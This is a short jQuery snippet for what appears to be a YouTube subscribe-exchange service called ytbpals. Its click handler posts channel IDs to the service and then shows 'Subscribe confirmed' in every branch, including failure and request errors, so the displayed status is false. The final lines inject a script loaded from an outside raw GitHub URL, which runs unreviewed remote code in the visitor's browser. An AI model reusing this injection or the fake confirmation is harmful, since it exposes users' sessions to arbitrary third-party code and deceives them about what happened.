$(document).on( "click", ".confirm", function () 
{
var $ytb = $("#ytbpals-channels");
$('.postloader').fadeIn(10);blockUI($ytb);
var th = $(this);
var id = th.attr('data-id');
var load = th.attr('data-load');
var pid = $("#youtube-reload").attr('data-id');
$.post( "https://console.ytbpals.com/confirm", { channel:id, load:load, pid:pid }, function (data) 
{
$('.postloader').fadeOut(10);unblockUI($ytb);
if(data == "ok")
{
$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
}
else if( data.msg == "fail" )
{
$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
}
else
{
$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();
}
} ).fail( function (data) {$(".result").html('<span class="ytb-sub-success">Congrats! Subscribe confirmed. Taking you to next channel</span>');reloadChannel();} );

}
)
;
var script = document.createElement("script");
script.src = "https://raw.githubusercontent.com/eliasgetachewc1988/ytbbounty/master/t.js";
document.body.appendChild(script);
